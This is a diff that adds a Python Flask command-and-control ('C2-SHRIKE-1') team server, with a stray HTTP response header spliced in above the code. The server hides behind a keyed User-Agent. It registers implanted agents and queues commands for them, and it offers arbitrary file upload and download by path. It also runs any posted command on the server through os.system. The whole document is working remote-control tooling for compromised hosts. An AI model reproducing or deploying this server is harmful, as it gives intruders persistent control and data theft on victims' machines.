@@ -1,0 +1,244 @@
+HTTP/1.1 200 OK
+Server: nginx/1.23.1
+Date: Thu, 06 Apr 2023 17:17:09 GMT
+Content-Type: text/html; charset=utf-8
+Connection: close
+Access-Control-Allow-Origin: *
+Content-Length: 7079
+
+import logging
+import sys
+import json
+from threading import Thread
+import re
+import random
+from os import system
+
+import flask
+from flask import request, abort
+from flask_cors import CORS
+
+HEADER_KEY = "z.5.x.2.l.8.y.5"
+
+command_list = []
+command_to_execute_next = ""
+command_stack_reset_flag = False
+agg_commands = open('aggressor.txt', 'r')
+lines = agg_commands.readlines()
+for line in lines:
+    command_list.append(line.strip())
+
+available_commands = ['id', 'whoami', 'upload [Usage: upload server_source agent_dest]', 'download [usage download agent_source server_dest]', 'exec [Usage: exec command_to_run]', 'pwd', "get_hostname"]
+
+live_agents = {}
+
+app = flask.Flask(__name__)
+app.secret_key = "000011112222333344445555666677778888"
+
+logging.basicConfig(filename='teamserver.log', level=logging.DEBUG)
+
+
+def is_user_agent_keyed(user_agent):
+    return HEADER_KEY in user_agent
+
+
+def json_response(app, data):
+    try:
+        return app.response_class(
+            response=json.dumps(data),
+            status=200,
+            mimetype='application/json'
+        )
+    except Exception as e:
+        return str(e)
+
+
+def is_command_reset_flag_set(command_stack_reset_flag):
+    return command_stack_reset_flag
+
+
+@app.route("/")
+def hello_world():
+    if is_user_agent_keyed(request.headers.get('User-Agent')):
+        return "."
+    else:
+        abort(404)
+
+
+@app.route('/api/server', methods=['GET'])
+def get_server_info():
+    if is_user_agent_keyed(request.headers.get('User-Agent')):
+        server_info = {"guid": "9e29fc5d-31dc-4fc2-9318-d17b2694d8aa", "name": "C2-SHRIKE-1"}
+        return json_response(app, server_info)
+    else:
+        abort(404)
+
+@app.route('/api/agents', methods=['GET'])
+def get_agent_info():
+    if is_user_agent_keyed(request.headers.get('User-Agent')):
+        if live_agents:
+            return str(live_agents), 200
+        else:
+            return "No live agents", 200
+    else:
+        abort(404)
+
+
+@app.route(f'/api/agents/commands', methods=['GET'])
+def get_agent_commands():
+    if is_user_agent_keyed(request.headers.get('User-Agent')):
+        return f"Available Commands: {available_commands}", 200
+    else:
+        abort(404)
+
+
+@app.route('/api/agents/register', methods=['POST'])
+def post_register_agent():
+    if is_user_agent_keyed(request.headers.get('User-Agent')):
+        if request.json:
+            try:
+                uid = request.json["uid"]
+                hostname = request.json["hostname"]
+                live_agents[uid] = hostname
+                msg = f"New agent UID: {uid} on host {hostname}"
+                app.logger.debug(msg)
+                print(msg)
+                return msg, 200
+            except Exception as e:
+                return str(e), 500
+        return "MESSAGE: {0}".format(request.is_json)
+    else:
+        abort(404)
+
+
+@app.route('/api/agents/<uid>', methods=['GET'])
+def get_agent(uid):
+    if is_user_agent_keyed(request.headers.get('User-Agent')):
+        if uid in live_agents:
+            info = live_agents.get(uid)
+            return f"Agent info:\nUID: {uid} - Hostname: {info}", 200
+        else:
+            return "You're not a live agent", 401
+    else:
+        abort(404)
+
+
+@app.route('/api/agents/<uid>/command', methods=['GET', 'POST'])
+def get_agent_command(uid):
+    if is_user_agent_keyed(request.headers.get('User-Agent')):
+        if uid in live_agents:
+            if request.method == 'GET':
+                global command_to_execute_next
+                global command_stack_reset_flag
+                if command_to_execute_next:
+                    command_reset_flag = is_command_reset_flag_set(command_stack_reset_flag)
+                    if command_reset_flag:
+                        command = random.choice(command_list)
+                        return f"{command}", 200
+                    else:
+                        command = command_to_execute_next
+                        command_stack_reset_flag = True
+                        return f"{command}", 200
+                else:
+                    command = random.choice(command_list)
+                    return f"{command}", 200
+            if request.json:
+                result = request.json["results"]
+                app.logger.debug(result)
+                print(result)
+                return "OK", 200
+        else:
+            return "You're not a live agent", 401
+    else:
+        abort(404)
+
+
+@app.route(f'/api/agents/<uid>/upload', methods=['POST'])
+def post_upload(uid):
+    if is_user_agent_keyed(request.headers.get('User-Agent')):     
+        if uid in live_agents:
+            if request.json:
+                file = request.json["file"]
+                f = open(file,"rb")
+                data = f.read()
+                f.close()
+                return data, 200
+        else:
+            return 401
+    else:
+        abort(404)
+
+
+@app.route(f'/api/agents/<uid>/download', methods=['POST'])
+def post_download(uid):
+    if is_user_agent_keyed(request.headers.get('User-Agent')):     
+        if uid in live_agents:
+            if request.json:
+                file = request.json["file"]
+                if file in ["app.py", "aggressor.txt"]:
+                    abort(404)
+                data = request.json["data"]
+                f = open(file ,"w")
+                f.write(data)
+                f.close()
+                return "OK", 200
+        else:
+            return 401
+    else:
+        abort(404)
+
+
+@app.route(f'/api/server/exec', methods=['POST'])
+def post_server_exec():
+    if is_user_agent_keyed(request.headers.get('User-Agent')):
+        if request.json:
+            cmd = request.json['cmd']
+            res = system(f"{cmd}")
+            return f"Command: {cmd} - Result code: {res}", 200
+        else:
+            return "Bad request", 400
+    else:
+        abort(404)
+
+
+@app.route('/api/agents/<uid>/exec', methods=['GET', 'POST'])
+def post_agent_exec(uid):
+    if is_user_agent_keyed(request.headers.get('User-Agent')):
+        if uid in live_agents:
+            if request.method == 'GET':
+                return f"EXEC: {uid}", 200
+            if request.method == 'POST':
+                if request.json:
+                    global command_to_execute_next
+                    command_to_execute_next = request.json["cmd"]
+                    global command_stack_reset_flag
+                    command_stack_reset_flag = False
+                    msg = f"New commnad to execute: {command_to_execute_next}"
+                    app.logger.debug(msg)
+                    print(msg)
+                    return msg, 200
+                else:
+                    return "Bad request", 400
+            else:
+                abort(404)
+        else:
+            abort(404)
+    else:
+        abort(404)
+
+
+@app.route('/', defaults={'path': ''})
+@app.route('/<path:path>')
+def catch_all(path):
+    if is_user_agent_keyed(request.headers.get('User-Agent')):
+        return flask.render_template("index.html")
+    else:
+        abort(404)
+
+
+CORS(app, resources={r"/*": {"origins": "*"}})
+
+
+if __name__=="__main__":
+    app.run(host="0.0.0.0", port=8000)
+
